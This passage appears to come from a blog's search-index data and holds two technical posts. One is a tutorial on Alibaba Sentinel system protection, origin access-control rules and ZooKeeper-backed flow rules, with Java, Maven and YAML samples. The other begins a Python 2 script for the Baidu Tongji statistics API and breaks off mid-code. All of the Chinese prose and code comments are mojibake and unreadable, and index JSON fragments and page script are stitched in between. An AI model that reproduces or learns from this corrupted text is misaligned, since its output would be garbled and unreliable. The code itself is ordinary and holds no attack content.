è¾¾åˆ°é˜ˆå€¼å³è§¦å‘ç³»ç»Ÿä¿æŠ¤ï¼Œå•ä½æ˜¯æ¯«ç§’ã€‚ å¹¶å‘çº¿ç¨‹æ•°ï¼šå½“å•å°æœºå™¨ä¸Šæ‰€æœ‰å…¥å£æµé‡çš„å¹¶å‘çº¿ç¨‹æ•°è¾¾åˆ°é˜ˆå€¼å³è§¦å‘ç³»ç»Ÿä¿æŠ¤ã€‚ å…¥å£ QPSï¼šå½“å•å°æœºå™¨ä¸Šæ‰€æœ‰å…¥å£æµé‡çš„ QPS è¾¾åˆ°é˜ˆå€¼å³è§¦å‘ç³»ç»Ÿä¿æŠ¤ã€‚ 4.2ã€ç³»ç»Ÿè‡ªé€‚åº”ä¿æŠ¤è§„åˆ™çš„å±æ€§ ç‰¹åˆ«æ³¨æ„ï¼šç³»ç»Ÿè‡ªé€‚åº”ä¿æŠ¤è§„åˆ™åªé’ˆå¯¹å…¥å£èµ„æºï¼ˆEntryType.INï¼‰æœ‰æ•ˆ 4.3ã€ç³»ç»Ÿè‡ªé€‚åº”ä¿æŠ¤è§„åˆ™çš„è®¾ç½®ç³»ç»Ÿè‡ªé€‚åº”ä¿æŠ¤è§„åˆ™è®¾ç½®æœ‰ä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼š æœ¬åœ°ä»£ç è®¾ç½® åœ¨ Sentinel æ§åˆ¶å°åŠ¨æ€è®¾ç½® 4.3.1ã€ä»£ç è®¾ç½®ä»¥ä¸‹æ¼”ç¤ºçš„æ˜¯å¦‚ä½•ä½¿ç”¨ å…¥å£ QPS ç³»ç»Ÿè‡ªé€‚åº”ä¿æŠ¤è§„åˆ™ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 1234567891011121314151617181920212223242526272829303132@RestControllerpublic class SystemProtectController { /** * å®šä¹‰èµ„æº * EntryType.IN è¡¨ç¤ºå…¥å£èµ„æº * * @return */ @SentinelResource(entryType = EntryType.IN) @GetMapping("/hello") public String hello() { return "Hello Sentinel!"; } /** * å®šä¹‰ç³»ç»Ÿè‡ªé€‚åº”ä¿æŠ¤è§„åˆ™ */ @PostConstruct public void initSystemRule() { // åˆ›å»ºå­˜æ”¾ç³»ç»Ÿè‡ªé€‚åº”ä¿æŠ¤è§„åˆ™çš„é›†åˆ List&lt;SystemRule&gt; rules = new ArrayList&lt;&gt;(); // åˆ›å»ºç³»ç»Ÿè‡ªé€‚åº”ä¿æŠ¤è§„åˆ™ SystemRule rule = new SystemRule(); // å®šä¹‰å…¥å£èµ„æºçš„QPSï¼ˆæ¯ç§’å…è®¸çš„æœ€å¤§è¯·æ±‚æ•°ï¼‰ rule.setQps(2); // æ·»åŠ ç³»ç»Ÿè‡ªé€‚åº”ä¿æŠ¤è§„åˆ™åˆ°é›†åˆä¸­ rules.add(rule); // åŠ è½½ç³»ç»Ÿè‡ªé€‚åº”ä¿æŠ¤è§„åˆ™ SystemRuleManager.loadRules(rules); }} ç¨‹åºè¿è¡Œåï¼Œå½“ /hello æ¥å£æ¯ç§’è¯·æ±‚çš„æ¬¡æ•°å¤§äº 2ï¼Œåˆ™ä¼šè§¦å‘ Sentinel çš„ç³»ç»Ÿè‡ªé€‚åº”ä¿æŠ¤è§„åˆ™ï¼ŒåŒæ—¶ä¼šè¿”å› Blocked by Sentinel (flow limiting) å­—ç¬¦ä¸²ç»™å®¢æˆ·ç«¯ã€‚ 4.3.2ã€Sentinel æ§åˆ¶å°åŠ¨æ€è®¾ç½® Sentinel æ¥æºè®¿é—®æ§åˆ¶å®ç°5.0ã€æ¥æºè®¿é—®æ§åˆ¶æ¦‚è¿°å¾ˆå¤šæ—¶å€™éœ€è¦æ ¹æ®è°ƒç”¨æ¥æºæ¥åˆ¤æ–­è¯¥æ¬¡è¯·æ±‚æ˜¯å¦å…è®¸æ”¾è¡Œï¼Œè¿™æ—¶å€™å¯ä»¥ä½¿ç”¨ Sentinel çš„æ¥æºè®¿é—®æ§åˆ¶ï¼ˆæˆæƒæ§åˆ¶ã€é»‘ç™½åå•æ§åˆ¶ï¼‰çš„åŠŸèƒ½ã€‚æ¥æºè®¿é—®æ§åˆ¶æ ¹æ®èµ„æºçš„è¯·æ±‚æ¥æºï¼ˆoriginï¼‰é™åˆ¶èµ„æºæ˜¯å¦é€šè¿‡ï¼Œè‹¥é…ç½®ç™½åå•åˆ™åªæœ‰è¯·æ±‚æ¥æºä½äºç™½åå•å†…æ—¶æ‰å¯é€šè¿‡ï¼›è‹¥é…ç½®é»‘åå•åˆ™è¯·æ±‚æ¥æºä½äºé»‘åå•æ—¶ä¸é€šè¿‡ï¼Œå…¶ä½™çš„è¯·æ±‚é€šè¿‡ã€‚è°ƒç”¨æ–¹çš„ä¿¡æ¯é€šè¿‡ ContextUtil.enter(resourceName, origin) æ–¹æ³•ä¸­çš„ origin å‚æ•°ä¼ å…¥ã€‚ç‰¹åˆ«æ³¨æ„ï¼Œç™½åå•å’Œé»‘åå•ä¸èƒ½åŒæ—¶ä½¿ç”¨ã€‚ 5.1ã€æ¥æºè®¿é—®æ§åˆ¶è§„åˆ™çš„å±æ€§æ¥æºè®¿é—®æ§åˆ¶è§„åˆ™ï¼ˆAuthorityRuleï¼‰éå¸¸ç®€å•ï¼Œä¸»è¦æœ‰ä»¥ä¸‹é…ç½®é¡¹ï¼š resourceï¼šèµ„æºåï¼Œå³æµæ§è§„åˆ™çš„ä½œç”¨å¯¹è±¡ã€‚ limitAppï¼šå¯¹åº”çš„é»‘åå• / ç™½åå•ï¼Œä¸åŒ origin ç”¨ , åˆ†éš”ï¼Œä¾‹å¦‚ appA,appBã€‚ strategyï¼šé™åˆ¶æ¨¡å¼ï¼ŒAUTHORITY_WHITE ä¸ºç™½åå•æ¨¡å¼ï¼ŒAUTHORITY_BLACK ä¸ºé»‘åå•æ¨¡å¼ï¼Œé»˜è®¤ä¸ºç™½åå•æ¨¡å¼ã€‚ 5.2ã€æ¥æºè®¿é—®æ§åˆ¶è§„åˆ™çš„è®¾ç½®æ¥æºè®¿é—®æ§åˆ¶è§„åˆ™è®¾ç½®æœ‰ä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼š æœ¬åœ°ä»£ç è®¾ç½® åœ¨ Sentinel æ§åˆ¶å°åŠ¨æ€è®¾ç½® 5.2.1ã€ä»£ç è®¾ç½®ä¸‹é¢å°†æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ç™½åå•æ¥æºè®¿é—®æ§åˆ¶è§„åˆ™ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 1234567891011/** * è‡ªå®šä¹‰æ¥æºè§£æå™¨ */ @Component public class RequestOriginParserDefinition implements RequestOriginParser { @Override public String parseOrigin(HttpServletRequest httpServletRequest) { return httpServletRequest.getRemoteAddr(); } } 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748@RestControllerpublic class OriginControlController { private static final String RESOURCE_NAME = "Origin"; /** * @return * @SentinelResource å®šä¹‰èµ„æº * valueï¼šèµ„æºåç§° * blockHandlerï¼šè¢«é™åˆ¶è®¿é—®æ—¶å¤„ç†çš„æ–¹æ³• */ @SentinelResource(value = RESOURCE_NAME, blockHandler = "exceptionHandler") @GetMapping("/hello") public String hello() { return "Hello Sentinel!"; } /** * åŸæ–¹æ³•è¢«é™åˆ¶è®¿é—®çš„æ—¶å€™è°ƒç”¨æ­¤æ–¹æ³• * * @param e * @return */ public String exceptionHandler(BlockException e) { return "ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å€™ ..."; } /** * å®šä¹‰æ¥æºè®¿é—®æ§åˆ¶è§„åˆ™ï¼ˆé»‘åå•ï¼‰ */ @PostConstruct public void initBlackRule() { // åˆ›å»ºå­˜æ”¾è§„åˆ™çš„é›†åˆ List&lt;AuthorityRule&gt; rules = new ArrayList&lt;&gt;(); // åˆ›å»ºæ¥æºè®¿é—®æ§åˆ¶è§„åˆ™ AuthorityRule rule = new AuthorityRule(); // å®šä¹‰èµ„æºåç§° rule.setResource(RESOURCE_NAME); // å®šä¹‰é™åˆ¶æ¨¡å¼ rule.setStrategy(RuleConstant.AUTHORITY_BLACK); // å®šä¹‰è¯·æ±‚æ¥æº rule.setLimitApp("127.0.0.1"); // å°†è§„åˆ™ä¿å­˜åˆ°é›†åˆä¸­ rules.add(rule); // åŠ è½½è§„åˆ™ AuthorityRuleManager.loadRules(rules); }} ç¨‹åºè¿è¡Œåï¼Œé€šè¿‡æµè§ˆå™¨è®¿é—® http://127.0.0.1:8080/helloï¼Œè‹¥å“åº”ç»“æœä¸º ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å€™ ...ï¼Œåˆ™è¯´æ˜ä¸Šé¢è®¾ç½®çš„é»‘åå•æ¥æºæ§åˆ¶è§„åˆ™ç”Ÿæ•ˆäº†ã€‚ 5.2.2ã€Sentinel æ§åˆ¶å°åŠ¨æ€è®¾ç½® Sentinel åŠ¨æ€è§„åˆ™æ‰©å±•ï¼ˆæŒä¹…åŒ–è§„åˆ™ï¼‰Sentinel çš„ç†å¿µæ˜¯å¼€å‘è€…åªéœ€è¦å…³æ³¨èµ„æºçš„å®šä¹‰ï¼Œå½“èµ„æºå®šä¹‰æˆåŠŸåå¯ä»¥åŠ¨æ€å¢åŠ å„ç§æµæ§é™çº§è§„åˆ™ã€‚Sentinel æä¾›ä»¥ä¸‹å‡ ç§æ–¹å¼è®¾ç½®è§„åˆ™ï¼š é€šè¿‡ API ç›´æ¥è®¾ç½® (loadRules) é€šè¿‡ DataSource é€‚é…ä¸åŒæ•°æ®æºä¿®æ”¹ æ‰‹åŠ¨é€šè¿‡ API è®¾ç½®æ¯”è¾ƒç›´è§‚ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‡ ä¸ª API è®¾ç½®ä¸åŒçš„è§„åˆ™ï¼š 1234FlowRuleManager.loadRules(List&lt;FlowRule&gt; rules); // è®¾ç½®æµæ§è§„åˆ™DegradeRuleManager.loadRules(List&lt;DegradeRule&gt; rules); // è®¾ç½®ç†”æ–­é™çº§è§„åˆ™SystemRuleManager.loadRules(List&lt;SystemRule&gt; rules); // è®¾ç½®ç³»ç»Ÿè‡ªé€‚åº”ä¿æŠ¤è§„åˆ™AuthorityRuleManager.loadRules(List&lt;AuthorityRule&gt; rules); // è®¾ç½®æ¥æºè®¿é—®æ§åˆ¶è§„åˆ™ 6.0ã€DataSource æ‰©å±•ä¸ç®¡æ˜¯é€šè¿‡ Java ä»£ç è¿˜æ˜¯é€šè¿‡ Sentinel æ§åˆ¶å°çš„æ–¹å¼è®¾ç½®æµæ§é™çº§è§„åˆ™ï¼Œéƒ½å±äºæ‰‹åŠ¨æ–¹å¼ï¼Œä¸å¤Ÿçµæ´»ã€‚è¿™ç§æ–¹å¼ä¸€èˆ¬ä»…ç”¨äºæµ‹è¯•å’Œæ¼”ç¤ºï¼Œç”Ÿäº§ç¯å¢ƒä¸€èˆ¬é€šè¿‡åŠ¨æ€è§„åˆ™æºçš„æ–¹å¼æ¥åŠ¨æ€ç®¡ç†æµæ§é™çº§è§„åˆ™ã€‚ä¸Šè¿° loadRules() æ–¹æ³•åªæ¥å—å†…å­˜æ€çš„è§„åˆ™å¯¹è±¡ï¼Œä½†æ›´å¤šæ—¶å€™è§„åˆ™å­˜å‚¨åœ¨æ–‡ä»¶ã€æ•°æ®åº“æˆ–è€…é…ç½®ä¸­å¿ƒå½“ä¸­ã€‚Sentinel çš„ DataSource æ¥å£æä¾›äº†å¯¹æ¥ä»»æ„æ•°æ®æºçš„èƒ½åŠ›ã€‚Sentinel å®˜æ–¹æ¨èé€šè¿‡æ§åˆ¶å°è®¾ç½®è§„åˆ™åï¼Œå°†è§„åˆ™æ¨é€åˆ°ç»Ÿä¸€çš„è§„åˆ™ä¸­å¿ƒï¼Œå®¢æˆ·ç«¯åˆ™å®ç° ReadableDataSource æ¥å£ç›‘å¬è§„åˆ™ä¸­å¿ƒæ¥å®æ—¶è·å–è§„åˆ™é…ç½®çš„å˜æ›´ï¼Œæµç¨‹å›¾å¦‚ä¸‹ï¼š DataSource æ‰©å±•å¸¸è§çš„å®ç°æ–¹å¼æœ‰: æ‹‰æ¨¡å¼ï¼šå®¢æˆ·ç«¯ä¸»åŠ¨å‘æŸä¸ªè§„åˆ™ç®¡ç†ä¸­å¿ƒå®šæœŸè½®è¯¢æ‹‰å–è§„åˆ™ï¼Œè¿™ä¸ªè§„åˆ™ä¸­å¿ƒå¯ä»¥æ˜¯ RDBMSã€æ–‡ä»¶ï¼Œç”šè‡³æ˜¯ VCS ç­‰ã€‚è¿™æ ·åšçš„æ–¹å¼æ˜¯ç®€å•ï¼Œç¼ºç‚¹æ˜¯æ— æ³•åŠæ—¶è·å–å˜æ›´ æ¨æ¨¡å¼ï¼šè§„åˆ™ä¸­å¿ƒç»Ÿä¸€æ¨é€ï¼Œå®¢æˆ·ç«¯é€šè¿‡æ³¨å†Œç›‘å¬å™¨çš„æ–¹å¼æ—¶åˆ»ç›‘å¬å˜åŒ–ï¼Œæ¯”å¦‚ä½¿ç”¨ Nacosã€Zookeeper ç­‰é…ç½®ä¸­å¿ƒï¼Œè¿™ç§æ–¹å¼æœ‰æ›´å¥½çš„å®æ—¶æ€§å’Œä¸€è‡´æ€§ä¿è¯ Sentinel ç›®å‰æ”¯æŒä»¥ä¸‹æ•°æ®æºæ‰©å±•ï¼š Pull-basedï¼ˆæ‹‰æ¨¡å¼ï¼‰: åŠ¨æ€æ–‡ä»¶æ•°æ®æºã€Consulã€Eureka Push-basedï¼ˆæ¨æ¨¡å¼ï¼‰: ZooKeeperã€Apolloã€Nacos, etcdã€Redis 6.1ã€ä½¿ç”¨ ZooKeeper è§„åˆ™é…ç½®ï¼ˆæ¨æ¨¡å¼ï¼‰ä¸‹é¢å°†æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ ZooKeeper å­˜æ”¾ Sentinel çš„æµæ§è§„åˆ™é…ç½®æ•°æ®ï¼Œä½¿ç”¨çš„æ˜¯ æ¨æ¨¡å¼ï¼Œå„ç»„ä»¶çš„ç‰ˆæœ¬å¦‚ä¸‹ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ Sentinel 1.8.0 ZooKeeper Server 3.5.5 Spring Boot 2.1.18.RELEASE Sentinel Datasource Zookeeper 1.8.0 Spring Cloud Starter Sentinel 2.1.3.RELEASE 6.1.1ã€ä»£ç ç¤ºä¾‹å¼•å…¥ Maven ä¾èµ–ï¼Œæ·»åŠ  sentinel-datasource-zookeeper ä¾èµ– 1234567891011121314151617181920212223242526272829303132333435&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;spring-cloud-starter-sentinel&gt;2.1.3.RELEASE&lt;/spring-cloud-starter-sentinel&gt; &lt;sentinel-datasource-zookeeper.version&gt;1.8.0&lt;/sentinel-datasource-zookeeper.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-starter-sentinel}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-datasource-zookeeper&lt;/artifactId&gt; &lt;version&gt;${sentinel-datasource-zookeeper.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»º Sentinel çš„ é…ç½®ç±»ï¼Œè®© Sentinel ä½¿ç”¨ ZooKeeper ä½œä¸ºè§„åˆ™é…ç½®æ•°æ®æº 12345678910111213141516171819202122232425@Configurationpublic class SentinelZookeeperConfig { public static final String ZOOKEEPER_ADDRESS = "127.0.0.1:2181"; public static final String ZOOKEEPER_PATH = "/Sentinel/FlowRules"; /** * Sentinelä»ZookeeperåŠ è½½è§„åˆ™é…ç½®æ•°æ® */ @PostConstruct public void init() { // å‚æ•°ä¸€ï¼šZookeeperçš„åœ°å€ // å‚æ•°äºŒï¼šZookeeperä¸­æ•°æ®çš„è·¯å¾„ // å‚æ•°ä¸‰ï¼šZookeeperä¸­æ•°æ®çš„è§£æå™¨ ReadableDataSource&lt;String, List&lt;FlowRule&gt;&gt; flowRuleDataSource = new ZookeeperDataSource&lt;&gt;( ZOOKEEPER_ADDRESS, ZOOKEEPER_PATH, source -&gt; JSON.parseObject(source, new TypeReference&lt;List&lt;FlowRule&gt;&gt;() { })); // åŠ è½½æµæ§è§„åˆ™ FlowRuleManager.register2Property(flowRuleDataSource.getProperty()); }} åˆ›å»º Controller æµ‹è¯•ç±» 123456789101112131415161718192021222324252627282930313233@RestControllerpublic class HelloController { private final static Logger LOG = LoggerFactory.getLogger(HelloController.class); /** * èµ„æºåç§° */ public static final String RESOURCE_NAME = "Hello"; /** * @return * @SentinelResource å®šä¹‰èµ„æº * valueï¼šèµ„æºåç§° * blockHandlerï¼šé™æµå¤„ç†çš„æ–¹æ³• */ @SentinelResource(value = RESOURCE_NAME, blockHandler = "exceptionHandler") @GetMapping("/hello") public String hello() { return "Hello Sentinel!"; } /** * åŸæ–¹æ³•è¢«é™æµçš„æ—¶å€™è°ƒç”¨æ­¤æ–¹æ³• * * @param e * @return */ public String exceptionHandler(BlockException e) { LOG.info("ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å€™ ..."); return "ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å€™ ..."; }} åˆ›å»ºä¸»å¯åŠ¨ç±» 1234567@SpringBootApplicationpublic class SentinelApplication { public static void main(String[] args) { SpringApplication.run(SentinelApplication.class, args); }} åˆ›å»º application.yml é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­ sentinel.transport.dashboard ä¸ºéå¿…è¦é…ç½®é¡¹ï¼›è‹¥ä¸éœ€è¦é€šè¿‡ Sentinel æ§åˆ¶å°ç›‘æ§åº”ç”¨ï¼Œè¿™é‡Œå¯ä»¥ä¸é…ç½® sentinel.transport.dashboardï¼Œæ— è®ºæ˜¯å¦é…ç½®éƒ½ä¸ä¼šå½±å“åº”ç”¨åŠ è½½å’ŒåŠ¨æ€æ„ŸçŸ¥ ZooKeeper Server ä¸­çš„è§„åˆ™é…ç½®æ•°æ® 12345678910server: port: 8080spring: application: name: sentinel-zookeeper-demo cloud: sentinel: transport: dashboard: 127.0.0.1:9000 # éå¿…è¦é…ç½®é¡¹ åˆ›å»º ZooKeeper çš„æ•°æ®æµ‹è¯•ç±»ï¼Œä½œç”¨æ˜¯æ’å…¥è§„åˆ™é…ç½®æ•°æ®åˆ° ZooKeeper 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556@RunWith(SpringRunner.class)@SpringBootTestpublic class ZookeeperConfigSender { private static final int RETRY_TIMES = 3; private static final int SLEEP_TIME = 1000; @Test public void sendData() throws Exception { final String remoteAddress = "127.0.0.1:2181"; final String groupId = "Sentinel"; final String dataId = "FlowRules"; final String rule = "[\\n" + " {\\n" + " \\"resource\\": \\"Hello\\",\\n" + " \\"controlBehavior\\": 0,\\n" + " \\"count\\": 2.0,\\n" + " \\"grade\\": 1,\\n" + " \\"limitApp\\": \\"default\\",\\n" + " \\"strategy\\": 0\\n" + " }\\n" + "]"; CuratorFramework zkClient = CuratorFrameworkFactory.newClient(remoteAddress, new ExponentialBackoffRetry(SLEEP_TIME, RETRY_TIMES)); zkClient.start(); String path = getPath(groupId, dataId); Stat stat = zkClient.checkExists().forPath(path); if (stat == null) { zkClient.create().creatingParentContainersIfNeeded().withMode(CreateMode.PERSISTENT).forPath(path, null); } zkClient.setData().forPath(path, rule.getBytes()); try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } zkClient.close(); } private static String getPath(String groupId, String dataId) { String path = ""; if (groupId.startsWith("/")) { path += groupId; } else { path += "/" + groupId; } if (dataId.startsWith("/")) { path += dataId; } else { path += "/" + dataId; } return path; }} 6.1.2ã€æµ‹è¯•ä»£ç  1ï¼‰å¯åŠ¨ ZooKeeper Server 2ï¼‰å¯åŠ¨ sentinel-zookeeper-demo åº”ç”¨ï¼Œè‹¥æ§åˆ¶å°è¾“å‡ºå¦‚ä¸‹æ—¥å¿—ä¿¡æ¯ï¼Œåˆ™è¯´æ˜åº”ç”¨å·²ç»æˆåŠŸè¿æ¥ä¸Š ZooKeeper æœåŠ¡å™¨ 1234[localhost:2181)] org.apache.zookeeper.ClientCnxn : Opening socket connection to server localhost/127.0.0.1:2181. Will not attempt to authenticate using SASL (unknown error)[localhost:2181)] org.apache.zookeeper.ClientCnxn : Socket connection established to localhost/127.0.0.1:2181, initiating session[localhost:2181)] org.apache.zookeeper.ClientCnxn : Session establishment complete on server localhost/127.0.0.1:2181, sessionid = 0x10000447be50007, negotiated timeout = 40000[ain-EventThread] o.a.c.f.state.ConnectionStateManager : State change: CONNECTED 3ï¼‰æµè§ˆå™¨è®¿é—® http://127.0.0.1:8080/helloï¼Œå¿«é€Ÿå¤šæ¬¡åˆ·æ–°é¡µé¢ï¼Œå¯ä»¥å‘ç°å“åº”ç»“æœä¼šä¸€ç›´è¿”å› Hello Sentinel! å­—ç¬¦ä¸² 4ï¼‰é€šè¿‡ Junit æ‰§è¡Œ ZookeeperConfigSender.sendData() æ–¹æ³•ï¼Œå°†è§„åˆ™é…ç½®æ•°æ®æ’å…¥åˆ° ZooKeeper Server 5ï¼‰é€šè¿‡å‘½ä»¤è¡Œç™»å½•è¿› ZooKeeper Server åï¼Œæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼Œå¯ä»¥è§‚å¯Ÿåˆ° ZooKeeper Server ä¸­æœ‰å¯¹åº”çš„è§„åˆ™é…ç½®æ•°æ®æˆåŠŸæ’å…¥äº† 1234567891011[zk: localhost:2181(CONNECTED) 15] get /Sentinel/FlowRules[ { "resource": "Hello", "controlBehavior": 0, "count": 2.0, "grade": 1, "limitApp": "default", "strategy": 0 }] 6ï¼‰æµè§ˆå™¨å†æ¬¡å¿«é€Ÿå¤šæ¬¡è®¿é—® http://127.0.0.1:8080/helloï¼Œè‹¥å“åº”ç»“æœä¸º ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å€™ ...ï¼Œåˆ™è¯´æ˜ Sentinel æˆåŠŸåŠ è½½åˆ° ZooKeeper Server é‡Œçš„è§„åˆ™é…ç½®æ•°æ®ï¼Œè€Œä¸”æ˜¯åŸºäº æ¨æ¨¡å¼ï¼Œé»˜è®¤æ”¯æŒç›‘å¬è§„åˆ™é…ç½®çš„å˜æ›´ 6.2ã€æ›´å¤šæ•°æ®æºæ‰©å±•æ”¯æŒSentinel é»˜è®¤è¿˜æ”¯æŒæ–‡ä»¶ã€Nacosã€Apolloã€Redis ç­‰ä½œä¸ºæ•°æ®æºæ‰©å±•ï¼Œè¿™é‡Œä¸å†ç´¯è¿°ï¼Œå…·ä½“å¯ä»¥é˜…è¯»å®˜æ–¹æ–‡æ¡£ä¸­çš„åŠ¨æ€è§„åˆ™æ‰©å±•ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"ç™¾åº¦ç»Ÿè®¡ APIï¼ˆPython ç‰ˆï¼‰",url:"/posts/94326301.html",text:"å‰è¨€ ç™¾åº¦ç»Ÿè®¡ API æ–‡æ¡£ ç™¾åº¦ç»Ÿè®¡ Token è·å– ç™¾åº¦ç»Ÿè®¡ API è°ƒè¯•å·¥å…· ä»¥ä¸‹ä»£ç å‚è€ƒäº†å®˜æ–¹ PHP ç‰ˆçš„ Demoï¼Œå…¼å®¹ Python2ï¼Œä¸å…¼å®¹ Python3 åˆ›å»º RSA å…¬é’¥æ–°å»º RSA å…¬é’¥æ–‡ä»¶ api_pub.keyï¼Œç„¶åå°†ä»¥ä¸‹å†…å®¹æ‹·è´å¹¶ä¿å­˜åˆ°è¯¥æ–‡ä»¶ä¸­ã€‚ 123456-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDHn/hfvTLRXViBXTmBhNYEIJeGGGDkmrYBxCRelriLEYEcrwWrzp0au9nEISpjMlXeEW4+T82bCM22+JUXZpIga5qdBrPkjU08Ktf5n7Nsd7n9ZeI0YoAKCub3ulVExcxGeS3RVxFai9ozERlavpoTOdUzEH6YWHP4reFfpMpLzwIDAQAB-----END PUBLIC KEY----- Python2 ä»£ç ä»¥ä¸‹ Python ä»£ç è°ƒç”¨äº†ç™¾åº¦ç»Ÿè®¡çš„ API æ¥å£ï¼Œé»˜è®¤ä¼šè·å–ä»Šå¤©å’Œæ˜¨å¤©çš„ç½‘ç«™æ¦‚å†µç»Ÿè®¡æ•°æ®ï¼Œç„¶åé€šè¿‡ Server é…± å°† MarkDown æ ¼å¼ï¼ˆHTML è¡¨æ ¼ï¼‰çš„ç»Ÿè®¡æ•°æ®å‘é€åˆ°ç‰¹å®šçš„æ‰‹æœºï¼ˆéœ€ç»‘å®š Server é…±çš„å¾®ä¿¡å…¬ä¼—å·ï¼‰ã€‚Linux ç³»ç»Ÿç¯å¢ƒä¸‹ï¼Œé…åˆ Python è„šæœ¬ + Crontab å®šæ—¶ä»»åŠ¡ï¼Œå³å¯å®šæ—¶å‘é€ç»Ÿè®¡æŠ¥è¡¨ä¿¡æ¯åˆ°ç‰¹å®šçš„æ‰‹æœºä¸Šï¼Œè¿™æ ·å°±ä¸å†éœ€è¦é¢‘ç¹ç™»å½• Web ç‰ˆçš„ç™¾åº¦ç»Ÿè®¡ç®¡ç†åå°äº†ã€‚è¯·è‡ªè¡Œæ›¿æ¢ä»£ç ä¸­çš„ PUBLIC_KEY_FILEã€USER_NAMEã€PASS_WORDã€TOKENã€SC_URL å˜é‡å€¼ï¼Œç‚¹å‡»æ­¤å¤„å¯æŸ¥çœ‹ç§»åŠ¨ç«¯çš„å±•ç¤ºæ•ˆæœã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345# --*-- coding:utf-8 ---*---import sysimport jsonimport requestsimport mathimport StringIOimport gzipimport rsaimport uuidimport timeimport loggingimport datetimereload(sys)sys.setdefaultencoding('utf8')UUID = str(uuid.uuid1())PUBLIC_KEY_FILE = './api_pub.key'LOG_FILE = \"/tmp/baidu_tongji_report.log\"ACCOUNT_TYPE = '1' # ç™¾åº¦ç»Ÿè®¡çš„è´¦å·ç±»å‹ï¼šZhanZhang:1, FengChao:2, Union:3, Columbus:4USER_NAME = 'xxxxxxxxx' # ç™¾åº¦ç»Ÿè®¡çš„ç”¨æˆ·åPASS_WORD = 'xxxxxxxxxxxxxxxxxx' # ç™¾åº¦ç»Ÿè®¡çš„å¯†ç TOKEN = 'xxxxxxxxxxxxxxxxxxxxxxxxxxx' # ç™¾åº¦ç»Ÿè®¡çš„TokenAPI_URL = 'https://api.baidu.com/json/tongji/v1/ReportService' # ç™¾åº¦ç»Ÿè®¡çš„æŸ¥è¯¢æ¥å£LOGIN_URL = 'https://api.baidu.com/sem/common/HolmesLoginService' # ç™¾åº¦ç»Ÿè®¡çš„ç™»å½•æ¥å£SC_URL = 'https://sc.ftqq.com/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.send' # Serveré…±çš„æ¶ˆæ¯æ¥å£def encrypt(data): # åŠ è½½å…¬é’¥ with open(PUBLIC_KEY_FILE) as publickfile: p = publickfile.read() pubkey = rsa.PublicKey.load_pkcs1_openssl_pem(p) # ç”¨å…¬é’¥åŠ å¯† n = int(math.ceil(len(data) * 1.0 / 117)) ret = '' for i in range(n): gzdata = data[i * 